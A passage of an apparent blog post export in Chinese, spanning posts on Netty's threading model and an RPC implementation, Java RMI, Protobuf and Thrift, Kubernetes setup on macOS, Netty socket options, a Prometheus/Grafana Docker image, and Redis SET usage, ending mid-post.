客户端通信序列图如下 Netty的IO线程NIOEventLoop由于聚合了多路复用器Selector，可以同时并发处理成败上千个客户端Channel，由于读写操作都是非阻塞的，这就可以充分提升IO线程的运行效率，避免由于频繁IO阻塞导致的线程挂起。 2.2.异步通讯NIO由于Netty采用了异步通信模式，一个IO线程可以并发处理N个客户端连接和读写操作，这从根本上解决了传统同步阻塞IO一连接一线程模型，架构的性能、弹性伸缩能力和可靠性都得到了极大的提升。 2.3.零拷贝（direct buffers 使用堆外直接内存） 1）Netty的接受和发送ByteBuffer采用direct buffers，使用堆外直接内存进行socket读写，不需要进行字节缓冲区的二次拷贝。如果使用传统的堆内存（heap buffers）进行socket读写，JVM会将堆内存buffer拷贝一份到直接内存中，然后才写入socket中。相比于堆外直接内存，消息在发送过程中多了一次缓冲区的内存拷贝。 2）Netty提供了组合buffer对象，可以聚合多个ByteBuffer对象，用户可以像操作一个buffer那样方便地对组合buffer进行操作，避免了传统通过内存拷贝的方式将几个小buffer合并成一个大的buffer。 3）Netty的文件传输采用了transferTo方法，它可以直接将文件缓冲区的数据发送到目标channel，避免了传统通过循环write方法导致的内存拷贝问题。 2.4.内存池（基于内存池的缓冲区重用机制）随着JVM虚拟机和JIT即时编译技术的发展，对象的分配和回收是个非常轻量级的工作。但是对于缓冲区buffer，情况却稍有不同，特别是对于堆外直接内存的分配和回收，是一件耗时的操作。为了尽量重用缓冲区，Netty提供了基于内存池的缓冲区重用机制。 2.5.高效的Reactor线程模型常用的reactor线程模型有三种，reactor单线程模型，reactor多线程模型，主从reactor多线程模型。 1）reactor单线程模型，指的是所有的IO操作都在同一个NIO线程上面完成，NIO线程的职责如下： 作为NIO服务端，接收客户端的TCP连接； 作为NIO客户端，向服务端发起TCP连接； 读取通信对端的请求或应答消息； 向通信对端发送消息请求或应答消息； 由于reactor模式使用的是异步非阻塞IO，所有的IO操作都不会导致阻塞，理论上一个线程可以独立处理所有IO相关的操作。从架构层面看，一个NIO线程确实可以完成其承担的职责。例如，通过acceptor接收客户端的TCP连接请求消息，链路建立成功后，通过dispatch将对应的ByteBuffer派发到指定的handler上进行消息解码。用户handler可以通过NIO线程将消息发送给客户端。 2）reactor多线程模型 reactor多线程模型与单线程模型最大的区别就是有一组NIO线程处理IO操作。有专门一个NIO线程-Acceptor线程用于监听服务端，接收客户端的TCP连接请求；网络IO操作-读、写等由一个NIO线程池负责，线程池可以采用标准的JDK线程池实现，它包含一个任务队列和N个可用的线程，由这些NIO负责消息的读取、解码、编码和发送； 3）主从reactor多线程模型 服务端用于接收客户端连接的不再是一个单独的NIO线程，而是一个独立的NIO线程池。acceptor接收客户端TCP连接请求处理完成后（可能包含接入认证等），将新创建的socketchannel注册到IO线程池（subReactor 线程池）的某个IO线程上，由它负责socketchannel的毒血和编解码工作。acceptor线程池仅仅只用于客户端的登陆、握手和安全认证，一旦链路建立成功，就将链路注册到后端subReactor线程池的IO线程上，由IO线程负责后续的IO操作。 2.6.无锁设计、线程锁定Netty采用了串行无锁化设计，在IO线程内部进行串行操作，避免多线程竞争导致的性能下降。表面上看，串行化设计似乎CPU利用率不高，并发程度不够。但是，通过调整NIO线程池的线程参数，可以同时启动多个串行化的线程并行运行，这种局部无锁化的串行线程设计相比一个队列-多个工作线程模型性能更优。Netty的NioEventLoop读取到消息后，直接调用ChannelPipeline的fireChannelRead（Object msg），只要用户不主动切换线程，一直会由NioEventLoop调用到用户的handler，期间不进行线程切换，这种串行化处理方式避免了多线程操作导致的锁竞争，从性能角度看是最优的。 2.7.高性能的序列化框架Netty默认提供了对Google Protobuf的支持，通过扩展Netty的编解码接口，用户可以实现其他的高性能序列化框架，例如Thrift的压缩二进制编解码框架。1）SO_RCVBUF和SO_SNDBUF：通常建议值为128K或256K。小包封大包，防止网络阻塞2）SO_TCPNODELAY：NAGLE算法通过将缓冲区内的小封包自动相连，组成较大的封包，阻止大量小封包的发送阻塞网络，从而提高网络应用效率。但是对于时延敏感的应用场景需要关闭该优化算法。软中断Hash值和CPU绑定3）软中断：开启RPS后可以实现软中断，提升网络吞吐量。RPS根据数据包的源地址，目的地址以及目的和源端口，计算出一个hash值，然后根据这个hash值来选择软中断运行的CPU，从上层来看，也就是说将每个连接和CPU绑定，并通过这个hash值，来均衡软中断在多个CPU上，提升网络并行处理性能。 3.Netty RPC实现RPC，即Remote Procedure Call（远程过程调用），调用远程计算机上的服务，就像调用本地服务一样。RPC可以很好的解耦系统，如webservice就是一种基于HTTP协议的RPC。这个RPC整体框架如下： 3.1.关键技术 1）服务发布与订阅：服务端使用zookeeper注册服务地址，客户端从zookeeper获取可用的服务地址。 2）通信：使用Netty作为通信框架。 3）Spring：使用spring配置服务，加载bean，扫描注解。 4）动态代理：客户端使用代理模式透明化服务调用。 5）消息编解码：使用Protostuff序列化和反序列化消息。 3.2.核心流程 1）服务消费方（client）调用以本地调用方式调用服务。 2）client stub 接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体。 3）client stub找到服务地址，并将消息发送到服务端。 4）server stub 收到消息后进行解码。 5）server stub 根据解码结果调用本地的服务。 6）本地服务执行并将结果返回给server stub。 7）server stub 将返回结果打包成消息并发送至消费方。 8）client stub 接受到消息，并进行解码。 9）服务消费方得到最终结果。 RPC的目标就是要2~8这些步骤都封装起来，让用户对这些细节透明。Java一般使用动态代理方式实现远程调用。 3.3.消息编解码消息数据结构（接口名称+方法名+参数类型和参数值+超时时间+requestID）客户端的请求消息结构一般需要包括以下内容： 1）接口名称：在我们的例子里接口名是“HelloWorldService”，如果不传，服务端就不知道调用哪个接口了； 2）方法名：一个接口内可能有很多方法，如果不传方法名，服务端就不知道调用的哪个方法； 3）参数类型和参数值：参数类型有很多，例如有boolean、int、long、double、string、map、list，甚至如struct（class）；以及相应的参数值； 4）超时时间 5）requestID：标识唯一请求id； 6）服务端返回的消息：一般包括：返回值+状态code+requestID 序列化 目前互联网公司广泛使用Protobuf、Thrift、Avro等成熟的序列化解决方案来搭建RPC框架，这些都是久经考验的解决方案。 3.4.通讯过程核心问题（线程暂停、消息乱序）如果使用netty的话，一般会用channel.writeAndFlush()方法来发送消息二进制串，这个方法调用后对于整个远程调用（从发送请求到接收到结果）来说是一个异步的，即对于当前线程来说，将请求发送出来后，线程就可以往后执行了。至于服务端的结果，是服务端处理完成后，再以消息的形式发送给客户端的。于是这里出现以下两个问题： 1）怎么让当前线程“暂停”，等结果回来后，再向后执行？ 2）如果有多个线程同时进行远程方法调用，这是建立在client server 之间的socket连接上会有很多双方发送的消息传递，前后顺序也可能是随机的，server处理完结果后，将结果消息发送给client，client收到很多消息，怎么知道哪个消息是原先哪个线程调用的？ 如下图所示，线程A和线程B同时向client socket发送请求requestA和requestB，socket先后将requestB和requestA发送至server，而server可能将responseB先返回，尽管requestB请求到达的时间更晚。我们需要一种机制保证responseA丢给ThreadA，responseB丢给ThreadB。通讯流程 requestID生成-AtomicLong 1）client 线程每次通过socket调用一次远程接口前，生成一个唯一的ID，即requestID（requestID必须保证在一个socket连接里面是唯一的），一般常常使用AtomicLong从0开始累计数字生成唯一ID。 存放回调对象callback到全局ConcurrentHashMap 2）将处理结果的回调对象callback，存放到全局ConcurrentHashMap里面put(requestID,callback)； synchronized获取回调对象callback的锁并自旋wait 3）当线程调用channel.writeAndFlush()发送消息后，紧接着执行callback的get()方法试图获取远程返回的结果。在get()内部，则使用synchronized获取回调对象callback的锁，再先检测是否已经获取到结果，如果没有，然后调用callback的wait()方法，释放callback上的锁，让当前线程处于等待状态。 监听消息的线程收到消息，找到callback上的锁并唤醒 4）服务端接收到请求并处理后，将response结果（此结果中包含了前面的requestID）发送给客户端，客户端socket连接上专门监听消息的线程收到消息，分析结果，取到requestID，再从前面的ConcurrnetHashMap里面get(requestID)，从而找到callback对象，再用synchronized获取callback上的锁，将方法调用结果设置到callback对象里，再调用callback.notifyAll()唤醒前面处于等待状态的线程。1234567891011121314151617public Object get() &#123; synchronized (this) &#123; // 旋锁 while (true) &#123; // 是否有结果了 If （!isDone）&#123; wait(); //没结果释放锁，让当前线程处于等待状态 &#125;else&#123;//获取数据并处理 &#125; &#125; &#125; &#125;private void setDone(Response res) &#123; this.res = res; isDone = true; synchronized (this) &#123; //获取锁，因为前面 wait()已经释放了 callback 的锁了 notifyAll(); // 唤醒处于等待的线程 &#125; &#125; 4.RMI实现方式Java远程方法调用，即Java RMI（Java remote method invocation）是Java编程语言里，一种用于实现远程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。 4.1.实现步骤 1）编写远程服务接口，该接口必须继承java.rmi.Remote接口，方法必须抛出java.rmi.RemoteException异常。 2）编写远程接口实现类，该实现类必须继承java.rmi.server.UnicastRemoteObject类； 3）运行RMI编译器（rmic），创建客户端stub类和服务端skeleton类； 4）启动一个RMI注册表，以便驻留这些服务； 5）在RMI注册表中注册服务； 6）客户端查找远程对象，并调用远程方法； 12345678910111213141516171819202122231：创建远程接口，继承 java.rmi.Remote 接口public interface GreetService extends java.rmi.Remote &#123; String sayHello(String name) throws RemoteException;&#125;2：实现远程接口，继承 java.rmi.server.UnicastRemoteObject 类public class GreetServiceImpl extends java.rmi.server.UnicastRemoteObject implements GreetService &#123; private static final long serialVersionUID = 3434060152387200042L; public GreetServiceImpl() throws RemoteException &#123; super(); &#125; @Override public String sayHello(String name) throws RemoteException &#123; return &quot;Hello &quot; + name; &#125;&#125;3：生成 Stub 和 Skeleton;4：执行 rmiregistry 命令注册服务5：启动服务 LocateRegistry.createRegistry(1098); Naming.bind(&quot;rmi://10.108.1.138:1098/GreetService&quot;, new GreetServiceImpl());6.客户端调用 GreetService greetService = (GreetService) Naming.lookup(&quot;rmi://10.108.1.138:1098/GreetService&quot;); System.out.println(greetService.sayHello(&quot;Jobs&quot;)); 5.Protocol BufferProtocol buffer是Google的一个开源项目，它是用于结构化数据串行化的灵活、高效、自动的方法，例如XML，不过它比XML更小、更快、更简单。你可以定义自己的数据结构，然后使用代码生成器的代码来读写这个数据结构。你甚至可以在无需重新部署程序的情况下更新数据结构。 5.1.特点Protocol Buffer的序列化 &amp; 反序列化简单 &amp; 速度快的原因是： 1）编码/解码方式简单（只需要简单的数字运算=位移等） 2）采用protocol buffer 自身的框架代码和编译器共同完成； Protocol Buffer的数据压缩效果好（即序列化的数据量体积小）的原因是： 1）采用了独特的编码方式，如Varint、Zigzag编码方式等； 2）采用T-L-V的数据存储方式，减少了分隔符的使用 &amp; 数据存储的紧凑6.ThriftApache Thrift是Facebook实现的一种高效的、支持多中编程语言的远程服务调用的框架。目前流行的服务调用方式有很多种，例如基于SOAP消息格式的web service，基于JSON消息格式的RESTful服务等。其中所用到的数据传输方式包括XML、JSON等，然而XML相对体积太大，传输效率低，JSON体积较小，新颖，但不够完善。本文将介绍由facebook开发的远程服务调用框架Apache Thrift，它采用接口描述语言定义并创建服务，支持可扩展的跨语言服务开发，所包含的代码生成引擎可以在多种语言中，如C++、Java、python、PHP、ruby等创建高效的、无缝的服务，其传输数据采用二进制格式，相对XML和JSON体积更小，对于高并发、大数据量和多语言的环境更有优势。","categories":[{"name":"rpc","slug":"rpc","permalink":"https://wuhaocn.github.io/categories/rpc/"}],"tags":[{"name":"netty","slug":"netty","permalink":"https://wuhaocn.github.io/tags/netty/"}]},{"title":"","slug":"devops/k8s/mac-k8s","date":"2022-10-05T09:54:38.946Z","updated":"2022-10-05T09:54:38.946Z","comments":true,"path":"2022/10/05/devops/k8s/mac-k8s/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/devops/k8s/mac-k8s/","excerpt":"","text":"mac安装k8s安装k8s大致有2种方式，minikube和Docker Desktop上，本文采用后者，前者见minikube安装k8s 环境一个小坑，原来本机已经安装docker 2.3.0，然后点击check for updates最高只检查到2.3.1，但是docker管网已经2.3.7，以为大部分安装都参考https://github.com/gotok8s/k8s-docker-desktop-for-mac 里面k8s版本为1.18.8对应docker 2.3.6.0（如果不按照这个对应关系，则需要找docker对应的k8s的镜像的地址，github上提了issue等待反馈） 安装拉取k8s镜像但是由于众所周知的原因, 国内的网络下不能很方便的下载 Kubernetes 集群所需要的镜像, 导致集群启用失败. 这里提供了一个简单的方法,利用 GitHub Actions 实现 k8s.gcr.io 上 kubernetes 依赖镜像自动同步到 Docker Hub 上指定的仓库中。通过 load_images.sh 将所需镜像从 Docker Hub 的同步仓库中取回，并重新打上原始的tag. 镜像对应关系文件可以查看: images. 12345678910第一步 克隆详细git clone https://github.com/gotok8s/k8s-docker-desktop-for-mac.git第二步 进入 k8s-docker-desktop-for-mac项目，拉取镜像./load_images.sh第三步 打开docker 配置页面，enable k8s。需要等k8s start一会 如果安装成功，则会显示kubernetes running 12345验证$ kubectl cluster-info$ kubectl get nodes$ kubectl describe node 安装 Kubernetes Dashboard123456789101112部署 Kubernetes Dashboard$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/master/aio/deploy/recommended.yaml#开启本机访问代理$ kubectl proxy创建Dashboard管理员用户并用token登陆# 创建 ServiceAccount kubernetes-dashboard-admin 并绑定集群管理员权限$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml# 获取登陆 token$ kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep kubernetes-dashboard-admin | awk &#x27;&#123;print $1&#125;&#x27;) 通过下面的连接访问 Dashboard: http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/ 输入上一步获取的token, 验证并登陆。 作者：waterWang001链接：https://www.jianshu.com/p/a6abdc6f76e1来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","categories":[],"tags":[]},{"title":"Netty常见配置参数","slug":"framework/netty/Netty常见配置参数","date":"2022-10-05T09:54:38.946Z","updated":"2022-10-05T09:54:38.947Z","comments":true,"path":"2022/10/05/framework/netty/Netty常见配置参数/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/framework/netty/Netty%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0/","excerpt":"","text":"1.前言Netty 中的 Option 和 ChildOption 的区别： 1.Netty 中的 option 主要是设置的 ServerChannel 的一些选项，而 childOption 主要是设置的 ServerChannel 的子 Channel 的选项。 2.如果是在客户端，因为是 Bootstrap，只会有 option 而没有 childOption，所以设置的是客户端 Channel 的选项。 本文转载自：Netty：option 和 childOption 参数设置说明 2.通用参数 CONNECT_TIMEOUT_MILLIS Netty 参数，连接超时毫秒数，默认值 30000 毫秒即 30 秒。 MAX_MESSAGES_PER_READ Netty 参数，一次 Loop 读取的最大消息数，对于 ServerChannel 或者 NioByteChannel，默认值为 16，其他 Channel 默认值为 1。默认值这样设置，是因为：ServerChannel 需要接受足够多的连接，保证大吞吐量，NioByteChannel 可以减少不必要的系统调用 select。 WRITE_SPIN_COUNT Netty 参数，一个 Loop 写操作执行的最大次数，默认值为 16。也就是说，对于大数据量的写操作至多进行 16 次，如果 16 次仍没有全部写完数据，此时会提交一个新的写任务给 EventLoop，任务将在下次调度继续执行。这样，其他的写请求才能被响应不会因为单个大数据量写请求而耽误。 ALLOCATOR Netty 参数，ByteBuf 的分配器，默认值为 ByteBufAllocator.DEFAULT，4.0 版本为 UnpooledByteBufAllocator，4.1 版本为 PooledByteBufAllocator。该值也可以使用系统参数 io.netty.allocator.type 配置，使用字符串值：”unpooled”，”pooled”。 RCVBUF_ALLOCATOR Netty 参数，用于 Channel 分配接受 Buffer 的分配器，默认值为 AdaptiveRecvByteBufAllocator.DEFAULT，是一个自适应的接受缓冲区分配器，能根据接受到的数据自动调节大小。可选值为 FixedRecvByteBufAllocator，固定大小的接受缓冲区分配器。 AUTO_READ Netty 参数，自动读取，默认值为 True。Netty 只在必要的时候才设置关心相应的 I/O 事件。对于读操作，需要调用 channel.read()设置关心的 I/O 事件为 OP_READ，这样若有数据到达才能读取以供用户处理。该值为 True 时，每次读操作完毕后会自动调用 channel.read()，从而有数据到达便能读取；否则，需要用户手动调用 channel.read()。需要注意的是：当调用 config.setAutoRead(boolean)方法时，如果状态由 false 变为 true，将会调用 channel.read()方法读取数据；由 true 变为 false，将调用 config.autoReadCleared()方法终止数据读取。 WRITE_BUFFER_HIGH_WATER_MARK Netty 参数，写高水位标记，默认值 64KB。如果 Netty 的写缓冲区中的字节超过该值，Channel 的 isWritable()返回 False。 WRITE_BUFFER_LOW_WATER_MARK Netty 参数，写低水位标记，默认值 32KB。当 Netty 的写缓冲区中的字节超过高水位之后若下降到低水位，则 Channel 的 isWritable()返回 True。写高低水位标记使用户可以控制写入数据速度，从而实现流量控制。推荐做法是：每次调用 channl.write(msg)方法首先调用 channel.isWritable()判断是否可写。 MESSAGE_SIZE_ESTIMATOR Netty 参数，消息大小估算器，默认为 DefaultMessageSizeEstimator.DEFAULT。估算 ByteBuf、ByteBufHolder 和 FileRegion 的大小，其中 ByteBuf 和 ByteBufHolder 为实际大小，FileRegion 估算值为 0。该值估算的字节数在计算水位时使用，FileRegion 为 0 可知 FileRegion 不影响高低水位。 SINGLE_EVENTEXECUTOR_PER_GROUP Netty 参数，单线程执行 ChannelPipeline 中的事件，默认值为 True。该值控制执行 ChannelPipeline 中执行 ChannelHandler 的线程。如果为 Trye，整个 pipeline 由一个线程执行，这样不需要进行线程切换以及线程同步，是 Netty4 的推荐做法；如果为 False，ChannelHandler 中的处理过程会由 Group 中的不同线程执行。 3.SocketChannel 参数 SO_RCVBUF Socket 参数，TCP 数据接收缓冲区大小。该缓冲区即 TCP 接收滑动窗口，linux 操作系统可使用命令：cat /proc/sys/net/ipv4/tcp_rmem 查询其大小。一般情况下，该值可由用户在任意时刻设置，但当设置值超过 64KB 时，需要在连接到远端之前设置。 SO_SNDBUF Socket 参数，TCP 数据发送缓冲区大小。该缓冲区即 TCP 发送滑动窗口，linux 操作系统可使用命令：cat /proc/sys/net/ipv4/tcp_smem 查询其大小。 TCP_NODELAY TCP 参数，立即发送数据，默认值为 True（Netty 默认为 True 而操作系统默认为 False）。该值设置 Nagle 算法的启用，改算法将小的碎片数据连接成更大的报文来最小化所发送的报文的数量，如果需要发送一些较小的报文，则需要禁用该算法。Netty 默认禁用该算法，从而最小化报文传输延时。 SO_KEEPALIVE Socket 参数，连接保活，默认值为 False。启用该功能时，TCP 会主动探测空闲连接的有效性。可以将此功能视为 TCP 的心跳机制，需要注意的是：默认的心跳间隔是 7200s 即 2 小时。Netty 默认关闭该功能。 SO_REUSEADDR Socket 参数，地址复用，默认值 False。有四种情况可以使用： (1)当有一个有相同本地地址和端口的 socket1 处于 TIME_WAIT 状态时，而你希望启动的程序的 socket2 要占用该地址和端口，比如重启服务且保持先前端口。 (2)有多块网卡或用 IP Alias 技术的机器在同一端口启动多个进程，但每个进程绑定的本地 IP 地址不能相同。 (3)单个进程绑定相同的端口到多个 socket 上，但每个 socket 绑定的 ip 地址不同。 (4)完全相同的地址和端口的重复绑定。但这只用于 UDP 的多播，不用于 TCP。 SO_LINGER Socket 参数，关闭 Socket 的延迟时间，默认值为-1，表示禁用该功能。-1 表示 socket.close()方法立即返回，但 OS 底层会将发送缓冲区全部发送到对端。0 表示 socket.close()方法立即返回，OS 放弃发送缓冲区的数据直接向对端发送 RST 包，对端收到复位错误。非 0 整数值表示调用 socket.close()方法的线程被阻塞直到延迟时间到或发送缓冲区中的数据发送完毕，若超时，则对端会收到复位错误。 IP_TOS IP 参数，设置 IP 头部的 Type-of-Service 字段，用于描述 IP 包的优先级和 QoS 选项。 ALLOW_HALF_CLOSURE Netty 参数，一个连接的远端关闭时本地端是否关闭，默认值为 False。值为 False 时，连接自动关闭；为 True 时，触发 ChannelInboundHandler 的 userEventTriggered()方法，事件为 ChannelInputShutdownEvent。 4.ServerSocketChannel 参数 SO_RCVBUF 已说明，需要注意的是：当设置值超过 64KB 时，需要在绑定到本地端口前设置。该值设置的是由 ServerSocketChannel 使用 accept 接受的 SocketChannel 的接收缓冲区。 SO_REUSEADDR Socket 参数，地址复用，默认值 False。有四种情况可以使用： (1)当有一个有相同本地地址和端口的 socket1 处于 TIME_WAIT 状态时，而你希望启动的程序的 socket2 要占用该地址和端口，比如重启服务且保持先前端口。 (2)有多块网卡或用 IP Alias 技术的机器在同一端口启动多个进程，但每个进程绑定的本地 IP 地址不能相同。 (3)单个进程绑定相同的端口到多个 socket 上，但每个 socket 绑定的 ip 地址不同。 (4)完全相同的地址和端口的重复绑定。但这只用于 UDP 的多播，不用于 TCP。 SO_BACKLOG Socket 参数，服务端接受连接的队列长度，如果队列已满，客户端连接将被拒绝。默认值，Windows 为 200，其他为 128。 5.DatagramChannel 参数 SO_BROADCAST Socket 参数，设置广播模式。 SO_RCVBUF 已说明 SO_SNDBUF 已说明 SO_REUSEADDR 已说明 IP_MULTICAST_LOOP_DISABLED 对应 IP 参数 IP_MULTICAST_LOOP，设置本地回环接口的多播功能。由于 IP_MULTICAST_LOOP 返回 True 表示关闭，所以 Netty 加上后缀_DISABLED 防止歧义。 IP_MULTICAST_ADDR 对应 IP 参数 IP_MULTICAST_IF，设置对应地址的网卡为多播模式。 IP_MULTICAST_IF 对应 IP 参数 IP_MULTICAST_IF2，同上但支持 IPV6。 IP_MULTICAST_TTL IP 参数，多播数据报的 time-to-live 即存活跳数。 IP_TOS 已说明 DATAGRAM_CHANNEL_ACTIVE_ON_REGISTRATION Netty 参数，DatagramChannel 注册的 EventLoop 即表示已激活。 6.参考https://www.jianshu.com/p/8670f49c32d0","categories":[{"name":"netty","slug":"netty","permalink":"https://wuhaocn.github.io/categories/netty/"}],"tags":[{"name":"netty","slug":"netty","permalink":"https://wuhaocn.github.io/tags/netty/"}]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/ubuntu/monitor/readme","date":"2022-10-05T09:54:38.942Z","updated":"2022-10-05T09:54:38.942Z","comments":true,"path":"2022/10/05/devops/docker/docker-package/dockerfiles/ubuntu/monitor/readme/","link":"","permalink":"https://wuhaocn.github.io/2022/10/05/devops/docker/docker-package/dockerfiles/ubuntu/monitor/readme/","excerpt":"","text":"1.镜像使用1.1.镜像安装docker stop monitordocker rm monitordocker run –name monitor –privileged=true -p 9090:9090 -p 3000:3000 -d wuhaocn/monitor:1.0docker update monitor –restart=always docker stop monitor-consuldocker rm monitor-consuldocker run –name monitor-consul –privileged=true -p 8500:8500 -p 9090:9090 -p 3000:3000 -d wuhaocn/monitor:2.0docker update monitor-consul –restart=always curl -X PUT -d ‘{“id”: “test1”,”name”: “test1”,”address”: “192.168.56.12”,”port”: 9100,”tags”: [“service”],”checks”: [{“http”: “http://192.168.56.12:9100/&quot;,&quot;interval&quot;: “5s”}]}’ http://192.168.56.12:8502/v1/agent/service/register 1234567891011121314151617181920212223242526272829303132333435root@9852cf5a3339:/# cat /usr/local/prometheus/prometheus.yml # my global configglobal: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s).# Alertmanager configurationalerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093# Load rules once and periodically evaluate them according to the global &#x27;evaluation_interval&#x27;.rule_files: # - &quot;first_rules.yml&quot; # - &quot;second_rules.yml&quot;# A scrape configuration containing exactly one endpoint to scrape:# Here it&#x27;s Prometheus itself.scrape_configs: # The job name is added as a label `job=&lt;job_name&gt;` to any timeseries scraped from this config. - job_name: &quot;prometheus&quot; # metrics_path defaults to &#x27;/metrics&#x27; # scheme defaults to &#x27;http&#x27;. static_configs: - targets: [&quot;localhost:9090&quot;] - job_name: &#x27;mapplication&#x27; metrics_path: / static_configs: - targets: [&#x27;192.168.3.41:8901&#x27;] 1.2.容器配置docker exec -it monitor bash 配置修改地址 /usr/local/grafana123456789root@f23762ac5af0:/usr/local/grafana/conf# lltotal 136drwxr-xr-x 3 root root 4096 Mar 31 12:35 ./drwxr-xr-x 1 root root 4096 Apr 7 02:09 ../-rw-r--r-- 1 root root 56590 Mar 31 12:35 defaults.ini-rw-r--r-- 1 root root 2270 Mar 31 12:35 ldap.toml-rw-r--r-- 1 root root 1045 Mar 31 12:35 ldap_multiple.tomldrwxr-xr-x 7 root root 4096 Mar 31 12:35 provisioning/-rw-r--r-- 1 root root 57840 Mar 31 12:35 sample.ini /usr/local/prometheus 12345678910111213root@f23762ac5af0:/usr/local/prometheus# lltotal 197396drwxr-xr-x 4 root root 4096 Apr 7 02:09 ./drwxr-xr-x 1 root root 4096 Apr 7 02:16 ../-rw-r--r-- 1 root root 6148 Apr 7 01:46 .DS_Store-rw-r--r-- 1 root root 11357 Mar 15 15:30 LICENSE-rw-r--r-- 1 root root 3773 Mar 15 15:30 NOTICEdrwxr-xr-x 2 root root 4096 Mar 15 15:30 console_libraries/drwxr-xr-x 2 root root 4096 Mar 15 15:30 consoles/-rwxr-xr-x 1 root root 105137495 Mar 15 15:21 prometheus*-rw-r--r-- 1 root root 934 Apr 6 06:11 prometheus.yml-rwxr-xr-x 1 root root 96946761 Mar 15 15:23 promtool* 1.3 配置生效修改后重启配置 2.镜像构建2.1.基础镜像docker stop ubuntu-testdocker rm ubuntu-testdocker run –name ubuntu-test –privileged=true -itd ubuntu:18.04 2.2.prometheus + grafanahttps://github.com/prometheus/prometheus/releases/download/v2.34.0/prometheus-2.34.0.linux-amd64.tar.gz https://dl.grafana.com/enterprise/release/grafana-enterprise-8.4.5.linux-amd64.tar.gz docker cp prometheus-2.34.0.linux-amd64.tar.gz b0e746f65da8:/home/soft/prometheus-2.34.0.linux-amd64.tar.gzdocker cp grafana-enterprise-8.4.5.linux-amd64.tar.gz b0e746f65da8:/home/soft/grafana-enterprise-8.4.5.linux-amd64.tar.gz tar -zxvf prometheus-2.34.0.linux-amd64.tar.gztar -zxvf grafana-enterprise-8.4.5.linux-amd64.tar.gz mkdir /home/data/mkdir /home/data/prometheusmkdir /home/data/grafana root@b0e746f65da8:/home/soft# mv prometheus-2.34.0.linux-amd64/ prometheus/root@b0e746f65da8:/home/soft# mv grafana-8.4.5 grafana prometheus.service123456789101112root@b0e746f65da8:/usr/local/grafana/bin# cat /etc/systemd/system/prometheus.service[Unit]Description=prometheusAfter=network.target[Service]Type=simpleUser=prometheusExecStart=/usr/local/prometheus/prometheus --config.file=/usr/local/prometheus/prometheus.yml --storage.tsdb.path=/home/data/prometheus/dataRestart=on-failure[Install]WantedBy=multi-user.target grafana.service1234567891011root@b0e746f65da8:/boot# cat /etc/systemd/system/grafana.service [Service]ExecStart=/usr/local/grafana/bin/grafana-server --config=/usr/local/grafana/conf/defaults.ini --homepath=/usr/local/grafana[Install]WantedBy=multi-user.target[Unit]Description=GrafanaAfter=network.target","categories":[],"tags":[]},{"title":"redis-set调用链","slug":"data/redis/command/set调用链","date":"2022-04-07T01:21:38.761Z","updated":"2022-04-07T01:21:38.761Z","comments":true,"path":"2022/04/07/data/redis/command/set调用链/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/command/set%E8%B0%83%E7%94%A8%E9%93%BE/","excerpt":"","text":"SETSET key value [EX seconds] [PX milliseconds] [NX|XX] 将字符串值 value 关联到 key 。 如果 key 已经持有其他值， SET 就覆写旧值，无视类型。 对于某个原本带有生存时间（TTL）的键来说， 当 SET 命令成功在这个键上执行时， 这个键原有的 TTL 将被清除。 可选参数1234567891011121314从 Redis 2.6.12 版本开始， SET 命令的行为可以通过一系列参数来修改：EX second ：设置键的过期时间为 second 秒。 SET key value EX second 效果等同于 SETEX key second value 。PX millisecond ：设置键的过期时间为 millisecond 毫秒。 SET key value PX millisecond 效果等同于 PSETEX key millisecond value 。NX ：只在键不存在时，才对键进行设置操作。 SET key value NX 效果等同于 SETNX key value 。XX ：只在键已经存在时，才对键进行设置操作。因为 SET 命令可以通过参数来实现和 SETNX 、 SETEX 和 PSETEX 三个命令的效果，所以将来的 Redis 版本可能会废弃并最终移除 SETNX 、 SETEX 和 PSETEX 这三个命令。可用版本：&gt;= 1.0.0时间复杂度：O(1)返回值：在 Redis 2.6.12 版本以前， SET 命令总是返回 OK 。 12从 Redis 2.6.12 版本开始， SET 在设置操作成功完成时，才返回 OK 。如果设置了 NX 或者 XX ，但因为条件没达到而造成设置操作未执行，那么命令返回空批量回复（NULL Bulk Reply）。 对不存在的键进行设置12345redis 127.0.0.1:6379&gt; SET testkey &quot;value&quot;OKredis 127.0.0.1:6379&gt; GET testkey&quot;value&quot; 对已存在的键进行设置12345redis 127.0.0.1:6379&gt; SET testkey &quot;new-value&quot;OKredis 127.0.0.1:6379&gt; GET testkey&quot;new-value&quot; 使用 EX 选项设置键的过期时间为 second 秒 12345678redis 127.0.0.1:6379&gt; SET testexkey &quot;hello&quot; EX 10000OKredis 127.0.0.1:6379&gt; GET testexkey&quot;hello&quot;redis 127.0.0.1:6379&gt; TTL testexkey(integer) 9986 使用 PX 选项设置键的过期时间为 millisecond 毫秒 123456789redis 127.0.0.1:6379&gt; SET testpxkey &quot;moto&quot; PX 100000OKredis 127.0.0.1:6379&gt; GET testpxkey&quot;moto&quot;redis 127.0.0.1:6379&gt; PTTL testpxkey(integer) 83818 使用 NX 选项只在键不存在时，才对键进行设置操作 1234567891011redis 127.0.0.1:6379&gt; SET testnxkey &quot;value&quot; NXOK # 键不存在，设置成功redis 127.0.0.1:6379&gt; GET testnxkey&quot;value&quot;redis 127.0.0.1:6379&gt; SET testnxkey &quot;new-value&quot; NX(nil) # 键已经存在，设置失败redis 127.0.0.1:6379&gt; GET testnxkey&quot;value&quot; # 维持原值不变 使用 XX 选项只在键已经存在时，才对键进行设置操作 1234567891011121314redis 